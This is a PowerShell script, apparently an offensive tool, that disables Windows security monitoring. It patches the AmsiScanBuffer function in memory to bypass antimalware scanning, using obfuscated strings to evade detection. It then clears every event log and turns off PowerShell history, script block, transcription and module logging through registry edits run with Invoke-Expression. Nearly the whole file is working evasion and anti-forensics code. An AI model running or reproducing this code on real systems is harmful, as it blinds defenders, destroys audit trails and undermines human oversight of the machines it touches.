<#
.SYNOPSIS
    Script to disable event logging, and powershell based logging.
.NOTES
    FILENAME: disable.ps1
    AUTHOR: @linkavych
    MODIFIED: 2021-06-25
#>
$lines="=============================="

function writer($a){
    Write-Host
    Write-Host -ForegroundColor DarkGreen $lines
    Write-Host -ForegroundColor DarkBlue " "$a
    Write-Host -ForegroundColor DarkGreen $lines
}
# bypass function here
$efeul = @"
using System;
using System.Runtime.InteropServices;
public class efeul {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr fbiouw, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $efeul

$aziscoe = [efeul]::LoadLibrary("$(('áms'+'ì.d'+'ll').NoRmaLiZE([CHAr]([Byte]0x46)+[cHAR]([bYte]0x6f)+[CHAR](114+31-31)+[cHar]([ByTe]0x6d)+[cHAr]([bYte]0x44)) -replace [chAr]([bytE]0x5c)+[chAR]([BYTE]0x70)+[chAR](64+59)+[cHaR](77+23-23)+[CHar](110*96/96)+[cHar]([byTe]0x7d))")
$rmerjt = [efeul]::GetProcAddress($aziscoe, "$(('ÁmsíScânBuf'+'fer').normALIZE([CHar]([BYTE]0x46)+[char]([BYTe]0x6f)+[Char](114*42/42)+[cHAr]([BYte]0x6d)+[CHaR]([bYtE]0x44)) -replace [cHAr]([bYTe]0x5c)+[CHAr]([bYtE]0x70)+[cHAr]([BYTE]0x7b)+[chAr]([byTe]0x4d)+[CHAr](28+82)+[chaR](125+24-24))")
$p = 0
[efeul]::VirtualProtect($rmerjt, [uint32]5, 0x40, [ref]$p)
$bzmd = "0xB8"
$bdrs = "0x57"
$fnlc = "0x00"
$pboq = "0x07"
$etpz = "0x80"
$zpcx = "0xC3"
$syzbm = [Byte[]] ($bzmd,$bdrs,$fnlc,$pboq,+$etpz,+$zpcx)
[System.Runtime.InteropServices.Marshal]::Copy($syzbm, 0, $rmerjt, 6)


$command_list = [ordered]@{

# This should clear each event log in turn. Admin required.
'Clear Logs'            = 'Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log}';

# Disable powershell history logging
'Disable Powershell Logs'   = 'Set-PSReadLineOption -HistorySaveStyle SaveNothing # nothing will be saved in user history file now';

# Disable Powershell script block logging in registry
'Disable Script Block Logs' = 'Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Powershell\ScriptblockLogging" -Name "EnableScriptBlockLogging" -Type "DWORD" -Value "0"';

# Disable Transcript logging in registry
'Disable Transcripting'     = 'Set-ItemProperty -Path "HKLM:\Software\WOW6432Node\Policies\Microsoft\Windows\Powershell\Transcription" -Name "EnableInvocationHeader" -Value "0"';
'Disable Transcripting2'    = 'Set-ItemProperty -Path "HKLM:\Software\WOW6432Node\Policies\Microsoft\Windows\Powershell\Transcription" -Name "EnableTranscripting" -Value "0"'

# Disable module logging
'Disable Module Logging'    = 'Set-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\Powershell\ModuleLogging" -Name "EnableModuleLogging" -Value "0"';
'Remove Moduole Logging'    = 'Remove-ItemProperty -Path "HKLM:\SOFTWARE\WOW6432Node\Policies\Microsoft\Windows\Powershell\ModuleLogging\ModuleNames" -Recurse';

# Disable Event logging


}
function RunCommands($commands){
    ForEach ($command in $commands.GetEnumerator()){
        writer $command.Name
        Invoke-Expression $command.Value
    }
}

RunCommands($command_list)

writer "[+] Executing commands..."
writer "[+] Complete!"

